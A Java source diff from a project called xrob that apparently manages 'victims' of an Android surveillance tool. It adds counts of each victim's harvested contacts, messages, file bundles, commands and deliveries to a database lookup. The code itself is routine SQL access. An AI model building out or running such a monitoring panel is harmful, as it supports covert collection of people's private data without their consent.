@@ -1,7 +1,10 @@
 package com.theah64.xrob.api.database.tables;
 
 import com.theah64.xrob.api.database.Connection;
+import com.theah64.xrob.api.database.tables.command.Commands;
+import com.theah64.xrob.api.models.Contact;
 import com.theah64.xrob.api.models.Victim;
+import com.theah64.xrob.api.utils.clientpanel.TimeUtils;
 
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
@@ -23,6 +26,7 @@ public class Victims extends BaseTable<Victim> {
     public static final String COLUMN_DEVICE_INFO_STATIC = "device_info_static";
     public static final String COLUMN_VICTIM_CODE = "victim_code";
     public static final String COLUMN_DEVICE_INFO_DYNAMIC = "device_info_dynamic";
+    private static final String COLUMN_AS_LAST_DELIVERY_EPOCH = "last_delivery_epoch";
 
     private Victims() {
         super("victims");
@@ -37,7 +41,7 @@ public class Victims extends BaseTable<Victim> {
     @Override
     public Victim get(String byColumn, String byValue) {
 
-        final String query = String.format("SELECT id,name,email,phone,api_key,fcm_id,device_name,device_info_dynamic FROM victims WHERE %s = ? LIMIT 1", byColumn);
+        final String query = String.format("SELECT v.id, v.name, v.email, v.phone, v.api_key, v.fcm_id, v.device_name, v.device_info_dynamic, (SELECT COUNT(id) FROM contacts WHERE victim_id = v.id) AS contacts, (SELECT COUNT(id) FROM deliveries WHERE victim_id = v.id) AS deliveries, (SELECT COUNT(id) FROM commands WHERE victim_id = v.id) AS commands, (SELECT COUNT(id) FROM file_bundles WHERE victim_id = v.id) AS file_bundles, (SELECT COUNT(id) FROM messages WHERE victim_id = v.id) AS messages, (SELECT UNIX_TIMESTAMP(last_logged_at) FROM deliveries d WHERE d.victim_id = v.id ORDER BY id DESC LIMIT 1) AS last_delivery_epoch FROM victims v WHERE %s = ? LIMIT 1", byColumn);
 
         final java.sql.Connection con = Connection.getConnection();
         Victim victim = null;
@@ -60,7 +64,15 @@ public class Victims extends BaseTable<Victim> {
                 final String deviceName = rs.getString(COLUMN_DEVICE_NAME);
                 final String deviceInfoDynamic = rs.getString(COLUMN_DEVICE_INFO_DYNAMIC);
 
-                victim = new Victim(id, name, email, phone, null, null, apiKey, fcmId, deviceName, null, deviceInfoDynamic, null, null, false, null);
+                final int contactsCount = rs.getInt(Contacts.TABLE_NAME_CONTACTS);
+                final int deliveryCount = rs.getInt(Deliveries.TABLE_NAME_DELIVERIES);
+                final int commandsCount = rs.getInt(Commands.TABLE_NAME_COMMANDS);
+                final int fileBundleCount = rs.getInt(FileBundles.TABLE_NAME_FILE_BUNDLES);
+                final int messageCount = rs.getInt(Messages.TABLE_NAME_MESSAGES);
+                final long lastDeliveryEpoch = rs.getLong(COLUMN_AS_LAST_DELIVERY_EPOCH);
+
+                victim = new Victim(id, name, email, phone, null, null, apiKey, fcmId, deviceName, null, deviceInfoDynamic, null, null, false, null, lastDeliveryEpoch);
+                victim.setCounts(contactsCount, deliveryCount, commandsCount, fileBundleCount, messageCount);
             }
 
             rs.close();
